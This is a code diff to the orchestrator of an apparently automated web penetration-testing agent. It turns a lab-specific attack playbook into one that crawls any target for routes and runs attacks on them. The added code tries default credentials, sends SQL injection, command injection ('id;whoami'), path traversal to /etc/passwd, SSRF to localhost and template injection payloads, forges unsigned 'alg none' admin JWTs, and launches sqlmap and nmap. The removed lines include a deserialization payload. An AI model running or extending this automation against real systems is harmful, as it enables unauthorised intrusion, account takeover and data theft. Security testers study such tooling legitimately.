@@ -3,6 +3,7 @@ from typing import Dict, Any
 from urllib.parse import urlparse
 import base64
 import json
+import re
 
 from confirmation import confirm_action
 from data_store import DataStore
@@ -595,7 +596,7 @@ class Orchestrator:
                 if step["tool"] == "websocket_interact" and "websocket_interact" not in tools_run:
                     return step
             if "sqlmap" not in tools_run:
-                return {"type": "tool", "tool": "sqlmap", "params": {"url": f"{base_url.rstrip('/')}/search?q=test"}}
+                return {"type": "tool", "tool": "sqlmap", "params": {"url": self._best_sqlmap_target(base_url)}}
             if "nmap" not in tools_run:
                 return {"type": "tool", "tool": "nmap", "params": {"target": host_only, "flags": "-Pn -p 2121,2222,3000,8081 -sV"}}
             return {"type": "complete"}
@@ -769,31 +770,238 @@ class Orchestrator:
 
     def _webapp_playbook(self, base_url: str, ws_target: str):
         forged_admin = self._build_unsigned_jwt({"role": "admin", "user": "admin"})
-        return [
-            {"type": "tool", "tool": "web_interact", "params": {"target": base_url, "path": "/", "method": "GET", "browser": True}},
-            {"type": "tool", "tool": "web_interact", "params": {"target": base_url, "path": "/login", "method": "GET", "browser": True}},
-            {"type": "tool", "tool": "web_interact", "params": {"target": base_url, "path": "/login", "method": "POST", "payload": {"username": "guest", "password": "guest"}, "session_name": "guest"}},
-            {"type": "tool", "tool": "web_interact", "params": {"target": base_url, "path": "/login", "method": "POST", "payload": {"username": "analyst", "password": "password"}, "session_name": "analyst"}},
-            {"type": "tool", "tool": "web_interact", "params": {"target": base_url, "path": "/login", "method": "POST", "payload": {"username": "admin", "password": "admin123"}, "session_name": "admin"}},
-            {"type": "tool", "tool": "web_interact", "params": {"target": base_url, "path": "/search", "method": "GET", "payload": {"q": "' UNION SELECT 1,2,3--"}, "browser": True}},
-            {"type": "tool", "tool": "web_interact", "params": {"target": base_url, "path": "/account", "method": "GET", "payload": {"id": "2"}, "session_name": "guest", "browser": True}},
-            {"type": "tool", "tool": "web_interact", "params": {"target": base_url, "path": "/account", "method": "GET", "payload": {"id": "2"}, "session_name": "analyst", "browser": True}},
-            {"type": "tool", "tool": "web_interact", "params": {"target": base_url, "path": "/board/1", "method": "GET", "browser": True}},
-            {"type": "tool", "tool": "web_interact", "params": {"target": base_url, "path": "/fetch", "method": "GET", "payload": {"url": "http://oracle:4000/metadata"}, "session_name": "analyst"}},
-            {"type": "tool", "tool": "web_interact", "params": {"target": base_url, "path": "/fetch", "method": "GET", "payload": {"url": "http://archives:4000/backups"}, "session_name": "analyst"}},
-            {"type": "tool", "tool": "web_interact", "params": {"target": base_url, "path": "/diagnostics", "method": "GET", "payload": {"cmd": "id;whoami"}, "session_name": "analyst"}},
-            {"type": "tool", "tool": "web_interact", "params": {"target": base_url, "path": "/download", "method": "GET", "payload": {"file": "../server.js"}, "session_name": "analyst"}},
-            {"type": "tool", "tool": "web_interact", "params": {"target": base_url, "path": "/api/token", "method": "GET", "session_name": "analyst"}},
-            {"type": "tool", "tool": "web_interact", "params": {"target": base_url, "path": "/api/admin/reports", "method": "GET", "headers": {"Authorization": f"Bearer {forged_admin}"}}},
-            {"type": "tool", "tool": "web_interact", "params": {"target": base_url, "path": "/csrf-demo", "method": "GET", "session_name": "analyst", "browser": True}},
-            {"type": "tool", "tool": "web_interact", "params": {"target": base_url, "path": "/import-lab", "method": "POST", "session_name": "analyst", "files": {"file": {"filename": "payload.json", "content": "{\"__reduce__\": \"os.system\"}", "content_type": "application/json"}}}},
-            {"type": "tool", "tool": "web_interact", "params": {"target": base_url, "path": "/template-lab", "method": "GET", "payload": {"name": "{{7*7}}"}, "session_name": "analyst"}},
-            {"type": "tool", "tool": "web_interact", "params": {"target": base_url, "path": "/missions", "method": "GET", "session_name": "analyst"}},
-            {"type": "tool", "tool": "web_interact", "params": {"target": base_url, "path": "/telemetry", "method": "GET", "session_name": "analyst"}},
-            {"type": "tool", "tool": "web_interact", "params": {"target": base_url, "path": "/campaign", "method": "GET", "session_name": "analyst"}},
-            {"type": "tool", "tool": "web_interact", "params": {"target": base_url, "path": "/api/export", "method": "GET", "session_name": "analyst"}},
-            {"type": "tool", "tool": "websocket_interact", "params": {"target": ws_target, "path": "/ws?role=admin", "messages": ["dump_state", {"action": "dump_state"}], "headers": {"Origin": base_url}}},
+        routes = self._candidate_web_paths()
+        common_auth_paths = ["/login", "/signin", "/auth/login", "/users/sign_in"]
+        common_search_paths = ["/search", "/find", "/query"]
+        common_object_paths = ["/account", "/profile", "/user"]
+        common_ssrf_paths = ["/fetch", "/proxy", "/api/fetch"]
+        common_cmd_paths = ["/diagnostics", "/debug", "/admin/exec"]
+        common_download_paths = ["/download", "/export", "/file"]
+        common_token_paths = ["/api/token", "/token", "/auth/token"]
+        common_admin_paths = ["/admin", "/api/admin", "/admin/reports"]
+        common_upload_paths = ["/upload", "/import", "/api/upload"]
+        common_template_paths = ["/template", "/render", "/preview"]
+        common_ws_paths = ["/ws", "/socket.io", "/websocket"]
+        credential_sets = [
+            ("guest", {"username": "guest", "password": "guest"}),
+            ("user", {"username": "user", "password": "password"}),
+            ("test", {"username": "test", "password": "test"}),
+            ("admin", {"username": "admin", "password": "admin"}),
         ]
+
+        def choose_paths(predicate, defaults):
+            matches = [path for path in routes if predicate(path)]
+            ordered = []
+            seen = set()
+            for path in matches + defaults:
+                normalized = self._normalize_candidate_path(path)
+                if normalized and normalized not in seen:
+                    seen.add(normalized)
+                    ordered.append(normalized)
+            return ordered
+
+        auth_paths = choose_paths(
+            lambda path: any(token in path.lower() for token in ["/login", "/signin", "/auth", "/session"]),
+            common_auth_paths,
+        )
+        search_paths = choose_paths(
+            lambda path: any(token in path.lower() for token in ["/search", "/find", "/query"]),
+            common_search_paths,
+        )
+        object_paths = choose_paths(
+            lambda path: any(token in path.lower() for token in ["/account", "/profile", "/user", "/member", "/customer", "/order", "/invoice"]),
+            common_object_paths,
+        )
+        content_paths = choose_paths(
+            lambda path: any(token in path.lower() for token in ["/board", "/post", "/article", "/message", "/comment"]),
+            [],
+        )
+        ssrf_paths = choose_paths(
+            lambda path: any(token in path.lower() for token in ["/fetch", "/proxy", "/url", "/webhook", "/import", "/crawl"]),
+            common_ssrf_paths,
+        )
+        cmd_paths = choose_paths(
+            lambda path: any(token in path.lower() for token in ["/diagnostic", "/debug", "/exec", "/console", "/shell", "/ping"]),
+            common_cmd_paths,
+        )
+        download_paths = choose_paths(
+            lambda path: any(token in path.lower() for token in ["/download", "/export", "/file", "/archive", "/backup"]),
+            common_download_paths,
+        )
+        token_paths = choose_paths(
+            lambda path: any(token in path.lower() for token in ["/token", "/jwt", "/oauth", "/session"]),
+            common_token_paths,
+        )
+        admin_paths = choose_paths(
+            lambda path: any(token in path.lower() for token in ["/admin", "/manage", "/dashboard", "/reports"]),
+            common_admin_paths,
+        )
+        upload_paths = choose_paths(
+            lambda path: any(token in path.lower() for token in ["/upload", "/import", "/attachment", "/avatar"]),
+            common_upload_paths,
+        )
+        template_paths = choose_paths(
+            lambda path: any(token in path.lower() for token in ["/template", "/render", "/preview", "/view"]),
+            common_template_paths,
+        )
+        ws_paths = choose_paths(
+            lambda path: any(token in path.lower() for token in ["/ws", "/socket", "/websocket"]),
+            common_ws_paths,
+        )
+
+        playbook = [
+            {"type": "tool", "tool": "web_interact", "params": {"target": base_url, "path": "/", "method": "GET", "browser": True}},
+        ]
+
+        for path in auth_paths[:2]:
+            playbook.append({"type": "tool", "tool": "web_interact", "params": {"target": base_url, "path": path, "method": "GET", "browser": True}})
+            for session_name, creds in credential_sets:
+                playbook.append({
+                    "type": "tool",
+                    "tool": "web_interact",
+                    "params": {"target": base_url, "path": path, "method": "POST", "payload": creds, "session_name": session_name},
+                })
+
+        for path in search_paths[:2]:
+            playbook.append({
+                "type": "tool",
+                "tool": "web_interact",
+                "params": {"target": base_url, "path": path, "method": "GET", "payload": {"q": "' UNION SELECT 1,2,3--"}, "browser": True},
+            })
+
+        for path in object_paths[:2]:
+            playbook.append({
+                "type": "tool",
+                "tool": "web_interact",
+                "params": {"target": base_url, "path": path, "method": "GET", "payload": {"id": "2"}, "browser": True},
+            })
+
+        for path in content_paths[:2]:
+            playbook.append({"type": "tool", "tool": "web_interact", "params": {"target": base_url, "path": path, "method": "GET", "browser": True}})
+
+        for path in ssrf_paths[:2]:
+            playbook.append({
+                "type": "tool",
+                "tool": "web_interact",
+                "params": {"target": base_url, "path": path, "method": "GET", "payload": {"url": "http://127.0.0.1:80"}, "session_name": "user"},
+            })
+
+        for path in cmd_paths[:2]:
+            playbook.append({
+                "type": "tool",
+                "tool": "web_interact",
+                "params": {"target": base_url, "path": path, "method": "GET", "payload": {"cmd": "id;whoami"}, "session_name": "user"},
+            })
+
+        for path in download_paths[:2]:
+            playbook.append({
+                "type": "tool",
+                "tool": "web_interact",
+                "params": {"target": base_url, "path": path, "method": "GET", "payload": {"file": "../../../../etc/passwd"}, "session_name": "user"},
+            })
+
+        for path in token_paths[:2]:
+            playbook.append({"type": "tool", "tool": "web_interact", "params": {"target": base_url, "path": path, "method": "GET", "session_name": "user"}})
+
+        for path in admin_paths[:2]:
+            playbook.append({"type": "tool", "tool": "web_interact", "params": {"target": base_url, "path": path, "method": "GET", "browser": True}})
+            playbook.append({
+                "type": "tool",
+                "tool": "web_interact",
+                "params": {"target": base_url, "path": path, "method": "GET", "headers": {"Authorization": f"Bearer {forged_admin}"}},
+            })
+
+        for path in upload_paths[:2]:
+            playbook.append({
+                "type": "tool",
+                "tool": "web_interact",
+                "params": {
+                    "target": base_url,
+                    "path": path,
+                    "method": "POST",
+                    "session_name": "user",
+                    "files": {"file": {"filename": "payload.txt", "content": "{{7*7}}", "content_type": "text/plain"}},
+                },
+            })
+
+        for path in template_paths[:2]:
+            playbook.append({
+                "type": "tool",
+                "tool": "web_interact",
+                "params": {"target": base_url, "path": path, "method": "GET", "payload": {"name": "{{7*7}}"}, "session_name": "user"},
+            })
+
+        for path in ws_paths[:1]:
+            playbook.append({
+                "type": "tool",
+                "tool": "websocket_interact",
+                "params": {"target": ws_target, "path": path, "messages": ["ping", {"action": "ping"}], "headers": {"Origin": base_url}},
+            })
+
+        return playbook
+
+    def _candidate_web_paths(self) -> list:
+        candidates = ["/"]
+        seen = {"/"}
+        path_pattern = re.compile(r"(?:href|action|src)\s*=\s*[\"']([^\"'#?]+(?:\?[^\"'#]*)?)[\"']", re.IGNORECASE)
+        text_path_pattern = re.compile(r"(?<![A-Za-z0-9_])/(?:[A-Za-z0-9._~!$&'()*+,;=:@%-]+/?)+(?:\?[A-Za-z0-9._~!$&'()*+,;=:@%/?-]+)?")
+
+        def add_path(raw_value: str):
+            normalized = self._normalize_candidate_path(raw_value)
+            if normalized and normalized not in seen:
+                seen.add(normalized)
+                candidates.append(normalized)
+
+        for item in self.state.get("history", []):
+            params = item.get("params", {}) or {}
+            add_path(str(params.get("path") or ""))
+
+            result = item.get("result", {}) or {}
+            for field in ("response_preview", "raw", "url", "full_url", "navigation_url"):
+                value = result.get(field)
+                if not isinstance(value, str) or not value:
+                    continue
+                for match in path_pattern.findall(value):
+                    add_path(match)
+                for match in text_path_pattern.findall(value):
+                    add_path(match)
+            raw_lines = str(result.get("raw") or "").splitlines()
+            for line in raw_lines:
+                token = line.strip().split()[0] if line.strip() else ""
+                if token:
+                    add_path(token)
+
+        return candidates
+
+    def _normalize_candidate_path(self, raw_value: str) -> str:
+        raw_value = str(raw_value or "").strip()
+        if not raw_value:
+            return ""
+        parsed = urlparse(raw_value)
+        if parsed.scheme and parsed.netloc:
+            path = parsed.path or "/"
+            if parsed.query:
+                path = f"{path}?{parsed.query}"
+        else:
+            path = raw_value
+        if path.startswith(("javascript:", "mailto:", "tel:", "#")):
+            return ""
+        if not path.startswith("/"):
+            path = f"/{path.lstrip('./')}"
+        if "//" in path and not path.startswith("//"):
+            path = re.sub(r"/{2,}", "/", path)
+        return path[:256]
+
+    def _best_sqlmap_target(self, base_url: str) -> str:
+        routes = self._candidate_web_paths()
+        for path in routes:
+            lowered = path.lower()
+            if any(token in lowered for token in ["/search", "/find", "/query"]):
+                separator = "&" if "?" in path else "?"
+                return f"{base_url.rstrip('/')}{path}{separator}q=test"
+            if "?" in path:
+                return f"{base_url.rstrip('/')}{path}"
+        return f"{base_url.rstrip('/')}/?id=1"
 
     def _build_unsigned_jwt(self, payload: Dict[str, Any]) -> str:
         header = {"alg": "none", "typ": "JWT"}
